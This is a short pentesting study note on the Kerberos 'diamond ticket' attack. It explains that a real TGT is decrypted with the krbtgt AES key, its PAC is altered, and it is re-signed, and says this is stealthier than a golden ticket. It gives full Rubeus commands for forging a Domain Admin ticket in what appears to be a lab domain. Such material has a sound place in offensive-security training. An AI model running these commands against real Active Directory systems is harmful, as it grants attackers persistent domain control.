# Diamond Ticket

A diamond ticket is created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account. 

Golden ticket was a TGT forging attacks whereas diamond ticket is a TGT modification attack. Once again, the persistence lifetime depends on krbtgt account. 

A diamond ticket is more opsec safe as it has:
- Valid ticket times because a TGT issued by the DC is modified
- In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged


In this scenario, an attacker that has knowledge of the service long-term key (krbtgt keys in case of a TGT, service account keys of Service Tickets) can request a legitimate ticket, decrypt the PAC, modify it, recalculate the signatures and encrypt the ticket again. 
This technique allows to produce a PAC that is highly similar to a legitimate one and also produces legitimate requests.


```
Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS


Rubeus.exe diamond
/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
/user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator
/domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local
/ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show
/ptt
```